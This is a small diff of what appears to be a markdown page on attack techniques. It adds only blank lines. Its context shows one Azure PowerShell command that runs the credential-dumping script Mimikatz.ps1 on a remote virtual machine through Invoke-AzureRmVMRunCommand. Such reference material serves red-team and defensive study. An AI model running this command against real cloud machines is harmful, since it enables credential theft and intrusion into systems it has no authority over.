@@ -15,3 +15,5 @@ updated_at: '2023-05-28T03:59:38.880779+00:00'
 ```bash
 Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
 ```
+
+
